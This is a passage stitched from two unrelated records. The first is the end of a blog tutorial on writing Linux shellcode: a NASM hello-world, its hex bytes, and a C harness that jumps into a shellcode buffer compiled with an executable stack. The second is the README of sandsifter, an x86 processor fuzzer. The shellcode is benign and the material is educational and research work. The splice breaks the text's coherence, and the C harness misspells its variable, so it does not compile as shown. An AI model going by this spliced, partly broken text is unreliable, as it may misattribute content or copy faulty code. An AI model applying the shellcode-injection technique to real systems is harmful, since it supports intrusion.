.data\nmessage: db \"Hello World!\", 0xA\nNow, we can create an executable (using nasm and ld) using the\nfollowing commands:\nnasm -f elf32 -o hello.o hello.asm\nld -o hello hello.o\n2. Test your shellcode\nIn order to test your shellcode you can use the following C program\n(which is a slightly modified version of the code from the (famous)\n\u201c[15]Smashing the stack for fun and profit\u201c):\n#include<stdio.h>\n#include<string.h>\nunsigned char shellcode[] = \\\n\"replace this with the hex version of the shellcode\";\nmain()\n{\nprintf(\"Shellcode Length:  %d\\n\", strlen(shelcode));\nint (*ret)() = (int(*)())shellcode;\nret();\n}\nThe above lines are simulating a vulnerable program by overwriting the\nreturn address of the main() function with the address of the\nshellcode, in order to execute the shellcode instructions upon exit\nfrom main().\nThe HEX version of the shellcode can be obtained from the binary file\nusing the objdump utility and a much smarter version of the command can\nbe found on [16]commandlinefu.com\nLets compute the HEX version of our dummy shellcode and then test it\nwith our  test program.\nThe HEX version of our assembler version of the dummy shellcode is the\nfollowing one:\n\"\\xb8\\x04\\x00\\x00\\x00\\xbb\\x01\\x00\\x00\\x00\\xb9\\xa4\\x90\\x04\\x08\n\\xba\\x0d\\x00\\x00\\x00\\xcd\\x80\\xb8\\x01\\x00\\x00\\x00\\xbb\\x05\\x00\\x00\\x00\\xcd\\x80\"\nWe add the new shelcode to the test program and then compile the test\nprogram:\ngcc  -z execstack shellcode.c -o shellcode\nWe execute the shelcode program and we have the following output:\n[17]Screenshot from 2015-08-19 23-33-15\nAs you can see the execution didn\u2019t went very well for a number of\nreasons that will be explained in the second part of this small\ntutorial.\nShare this:\n* [18]Twitter\n* [19]Reddit\n* [20]LinkedIn\n* [21]Email\n* [22]More\n*\n* [23]Print\n* [24]Facebook\n*\nLike Loading...\nRelated\n[25]Programming, [26]Security, [27]Shellcode[28]Assembly language,\n[29]C language, [30]GCC, [31]GDB, [32]Linux, [33]NASM, [34]Programming,\n[35]Shellcode\n[36]Previous Article How to use an external JavaScript file in a\nBIRT report\n[37]Next Article Introduction to Linux shellcode writing (Part 2)\nSocial\n* [38]View citu_adrian\u2019s profile on Twitter\n* [39]View cituadrian\u2019s profile on LinkedIn\n* [40]View adriancitu\u2019s profile on GitHub\nToday Top Posts & Pages\n* [41]How to run Cisco ASDM as a Java Web Start application\n* [42]How to remotely connect to an in-memory HSQLDB database\n* [43]How to upload (big) files to Jenkins job as build parameter\n* [44]Introduction to Linux shellcode writing (Part 1)\n* [45]Apache Hadoop technology stack for dummies\n* [46]Containers landscape: seen through OCI and CNCF standards lens\n* [47]How to properly use (Java) Text Blocks with String.format\n* [48](My) CISSP Notes - Legal, regulations , investigations and\ncompliance\n* [49](My) CISSP Notes - Information Security Governance and Risk\nManagement\n* [50]How to create and customize a Docker image for Burp Suite\nProfessional Edition\nCategories\nCategories[Select Category____________________]\nTags Cloud\n[51]Abuse Cases [52]Access Control [53]Access Control Models [54]Agile\nSoftware Development [55]AOP [56]Apache ZooKeeper [57]AspectJ\n[58]Assembly language [59]BackTrack [60]Bell-LaPadula [61]Big Data\n[62]Book Review [63]BruCON [64]BruCON 2015 [65]BruCON 2016 [66]Buffer\noverflow [67]Certification [68]Certified Information Systems Security\nProfessional [69]CISSP [70]C language [71]Clark-Wilson [72]Computer\nForensics [73]Computer security [74]Containers [75]Cross Site Request\nForgery [76]CSRF [77]CSSLP [78]DFF [79]Digital Forensic Framework\n[80]Docker [81]ElasticSearch [82]GCC [83]GDB [84]Hacking [85]Intrusion\nDetection System [86]Investigation numerique [87]It Forensics [88]Java\n[89]K8S [90]Kerberos [91]Keystore [92]Kubernetes [93]Linux [94]Malware\n[95]Maven [96]NASM [97]OWASP [98]OWASP Application Security\nVerification Standard [99]OWASP Security Knowledge Framework [100]OWASP\nSKF [101]Pare-feu applicatif [102]Penetration test [103]Pentest\n[104]podman [105]Programming [106]Python [107]Risk Management [108]SCEA\n[109]SDLC [110]Secure Development Lifecycle [111]Secure operating\nsystem and software architecture [112]Security [113]Shellcode\n[114]Spiral Model [115]SQL injection [116]SSL [117]Stack buffer\noverflow [118]STRIDE [119]Threat Modeling [120]Transport Layer Security\n[121]Volatility [122]waf [123]Waterfall Model [124]Web Application\nFirewall [125]XSS\nCSSLP Logo\n[126]Cissp Logo\nSCEA Logo\n[127]Create a website or blog at WordPress.com\n* [128]Subscribe [129]Subscribed\n+ [130]Adventures in the programming jungle\nJoin 55 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [131]Log in now.\n*\n+ [132]Adventures in the programming jungle\n+ [133]Customize\n+ [134]Subscribe [135]Subscribed\n+ [136]Sign up\n+ [137]Log in\n+ [138]Copy shortlink\n+ [139]Report this content\n+ [140]View post in Reader\n+ [141]Manage subscriptions\n+ [142]Collapse this bar\nLoading Comments...\nYou must be [143]logged in to post a comment.\nIFRAME: [144]likes-master\n%d"}
{"text":"## s a n d s i f t e r \n: the x86 processor fuzzer\n\n### Overview\n\nThe sandsifter audits x86 processors for hidden instructions and hardware bugs,\nby systematically generating machine code to search through a processor's\ninstruction set, and monitoring execution for anomalies. Sandsifter has\nuncovered secret processor instructions from every major vendor; ubiquitous\nsoftware bugs in disassemblers, assemblers, and emulators; flaws in enterprise\nhypervisors; and both benign and security-critical hardware bugs in x86 chips.\n\nWith the multitude of x86 processors in existence, the goal of the tool is to\nenable users to check their own systems for hidden instructions and bugs.\n\nTo run a basic audit against your processor:\n\n```\nsudo .\/sifter.py --unk --dis --len --sync --tick -- -P1 -t\n```\n\n![demo_sandsifter](references\/sandsifter.gif)\n\nThe computer is systematically scanned for anomalous instructions.  In the upper\nhalf, you can view the instructions that the sandsifter is currently testing on\nthe processor.  In the bottom half, the sandsifter reports anomalies it finds.\n\nThe search will take from a few hours to a few days, depending on the speed of\nand complexity of your processor.  When it is complete, summarize the results:\n\n```\n.\/summarize.py data\/log\n```\n\n![demo_summarizer](references\/summarizer.png)\n\nTypically, several million undocumented instructions on your processor will be\nfound, but these generally fall into a small number of different groups.  After\nbinning the anomalies, the summarize tool attempts to assign each instruction to\nan issue category:\n\n* Software bug (for example, a bug in your hypervisor or disassembler),\n* Hardware bug (a bug in your CPU), or\n* Undocumented instruction (an instruction that exists in the processor, but is\n  not acknowledged by the manufacturer)\n\nPress 'Q' to quit and obtain a text based summary of the system scan:\n\nThe results of a scan can sometimes be difficult for the tools to automatically\nclassify, and may require manual analysis. For help analyzing your results, feel\nfree to send the .\/data\/log file to xoreaxeaxeax@gmail.com.  No personal\ninformation, other than the processor make, model, and revision (from\n\/proc\/cpuinfo) are included in this log.\n\n\n### Results\n\nScanning with the sandsifter has uncovered undocumented processor features\nacross dozens of opcode categories, flaws in enterprise hypervisors, bugs in\nnearly every major disassembly and emulation tool, and critical hardware bugs\nopening security vulnerabilities in the processor itself.\n\nDetails of the results can be found in the project \n[whitepaper](.\/references\/domas_breaking_the_x86_isa_wp.pdf).\n\n(TODO: detailed results enumeration here)\n\n\n### Building\n\nSandsifter requires first installing the Capstone disassembler:\nhttp:\/\/www.capstone-engine.org\/.  Capstone can typically be installed with:\n\n```\nsudo apt-get install libcapstone3 libcapstone-dev\nsudo pip install capstone\n```\n\nSandsifter can be built with:\n\n```\nmake\n```\n\nand is then run with \n\n```\nsudo .\/sifter.py --unk --dis --len --sync --tick -- -P1 -t\n```\n\n### Flags\n\nFlags are passed to the sifter with --flag, and to the injector with -- -f.\n\nExample:\n\n```\nsudo .\/sifter.py --unk --dis --len --sync --tick -- -P1 -t\n```\n\nSifter flags:\n\n```\n--len\n\tsearch for length differences in all instructions (instructions that\n\texecuted differently than the disassembler expected, or did not\n\texist when the disassembler expected them to\n\n--dis\n\tsearch for length differences in valid instructions (instructions that\n\texecuted differently than the disassembler expected)\n\n--unk\n\tsearch for unknown instructions (instructions that the disassembler doesn't\n\tknow about but successfully execute)\n\n--ill\n\tthe inverse of --unk, search for invalid disassemblies (instructions that do\n\tnot successfully execute but that the disassembler acknowledges)\n\n--tick\n\tperiodically write the current instruction to disk\n\n--save\n\tsave search progress on exit\n\n--resume\n\tresume search from last saved state\n\n--sync\n\twrite search results to disk as they are found\n\n--low-mem\n\tdo not store results in memory\n```\n\nInjector flags:\n\n```\n-b\n\tmode: brute force\n\n-r\n\tmode: randomized fuzzing\n\n-t\n\tmode: tunneled fuzzing\n\n-d\n\tmode: externally directed fuzzing\n\n-R\n\traw output mode\n\n-T\n\ttext output mode\n\n-x\n\twrite periodic progress to stderr\n\n-0\n\tallow null dereference (requires sudo)\n\n-D\n\tallow duplicate prefixes\n\n-N\n\tno nx bit support\n\n-s seed\n\tin random search, seed value\n\n-B brute_depth\n\tin brute search, maximum search depth\n\n-P max_prefix\n\tmaximum number of prefixes to search\n\n-i instruction\n\tinstruction at which to start search (inclusive)\n\n-e instruction\n\tinstruction at which to end search (exclusive)\n\n-c core\n\tcore on which to perform search\n\n-X blacklist\n\tblacklist the specified instruction\n\n-j jobs\n\tnumber of simultaneous jobs to run\n\n-l range_bytes\n\tnumber of base instruction bytes in each sub range\n```\n\n\n### Keys\n\nm: Mode - change the search mode (brute force, random, or tunnel) for the sifter\n\nq: Quit - exit the sifter\n\np: Pause - pause or unpause the search\n\n\n### Algorithms\n\nThe scanning supports four different search algorithms, which can be set at the\ncommand line, or cycled via hotkeys.\n\n* Random searching generates random instructions to test; it generally produces\n  results quickly, but is unable to find complex hidden instructions and bugs.\n* Brute force searching tries instructions incrementally, up to a user-specified\n  length; in almost all situations, it performs worse than random searching.\n* Driven or mutation driven searching is designed to create new, increasingly\n  complex instructions through genetic algorithms; while promising, this\n  approach was never fully realized, and is left as a stub for future research.\n* Tunneling is the approach described in the presentation and white paper, and\n  in almost all cases provides the best trade-off between thoroughness and\n  speed.\n\n\n### Tips\n\n* sudo\n\n\tFor best results, the tool should be run as the root user.  This is necessary so\n\tthat the process can map into memory a page at address 0, which requires root\n\tpermissions.  This page prevents many instructions from seg-faulting on memory\n\taccesses, which allows a more accurate fault analysis.\n\n* Prefixes\n\n\tThe primary limitation for the depth of an instruction search is the number\n\tof prefix bytes to explore, with each additional prefix byte increasing the\n\tsearch space by around a factor of 10.  Limit prefix bytes with the -P flag.\n\n* Colors\n\n\tThe interface for the sifter is designed for a 256 color terminal.  While\n\tthe details vary greatly depending on your terminal, this can roughly be\n\taccomplished with:\n\n\t```\n\texport TERM='xterm-256color'\n\t```\n\n* GUI\n\n\tThe interface assumes the terminal is of at least a certain size; if the\n\tinterface is not rendering properly, try increasing the terminal size; this\n\tcan often be accomplished by decreasing the terminal font size.\n\n\tIn some cases, it may be desirable or necessary to run the tool without the\n\tgraphical front end.  This can be done by running the injector directly:\n\n\t```\n\tsudo .\/injector -P1 -t -0\n\t```\n\n\tTo filter the results of a direct injector invocation, grep can be used.\n\tFor example,\n\n\t```\n\tsudo .\/injector -P1 -r -0 | grep '\\.r' | grep -v sigill\n\t```\n\n\tsearches for instructions for which the processor and disassembler disagreed\n\ton the instruction length (grep '\\.r'), but the instruction successfully\n\texecuted (grep -v sigill).\n\n* Targeted fuzzing\n\n\tIn many cases, it is valuable to direct the fuzzer to a specific target.\n\tFor example, if you suspect that an emulator has flaws around repeated 'lock'\n\tprefixes (0xf0), you could direct the fuzzer to search this region of the\n\tinstruction space with the -i and -e flags:\n\n\t```\n\tsudo .\/sifter.py --unk --dis --len --sync --tick -- -t -i f0f0 -e f0f1 -D -P15\n\t```\n\n* Legacy systems\n\n\tFor scanning much older systems (i586 class processors, low memory systems),\n\tpass the --low-mem flag to the sifter and the -N flag to the injector:\n\n\t```\n\tsudo .\/sifter.py --unk --dis --len --sync --tick --low-mem -- -P1 -t -N\n\t```\n\n\tIf you observe your scans completing too quickly (for example, a scan\n\tcompletes in seconds), it is typically because these flags are required for\n\tthe processor you are scanning.\n\n* 32 vs. 64 bit\n\n\tBy default, sandsifter is built to target the bitness of the host operating\n\tsystem.  However, some instructions have different behaviors when run in a\n\t32 bit process compared to when run in a 64 bit process.  To explore these\n\tscenarios, it is sometimes valuable to run a 32 bit sandsifter on a 64 bit\n\tsystem.\n\n\tTo build a 32 bit sandsifter on a 64 bit system, Capstone must be installed\n\tas 32 bit; the instructions for this can be found at http:\/\/www.capstone-engine.org\/.\n\n\tThen sandsifter must be built for a 32 bit architecture:\n\n\t```\n\tmake CFLAGS=-m32\n\t```\n\n\tWith this, the 32 bit instruction space can be explored on a 64 bit system.\n\n\n### References\n\n* A discussion of the techniques and results can be found in the Black Hat\n  [presentation](https:\/\/www.youtube.com\/watch?v=KrksBdWcZgQ).\n* Technical details are described in the\n  [whitepaper](.\/references\/domas_breaking_the_x86_isa_wp.pdf).\n* Slides from the Black Hat presentation are\n  [here](.\/references\/domas_breaking_the_x86_isa.pdf).\n\n\n### Author\n\nsandsifter is a research effort from Christopher Domas\n([@xoreaxeaxeax](https:\/\/twitter.com\/xoreaxeaxeax)).\n\n"}
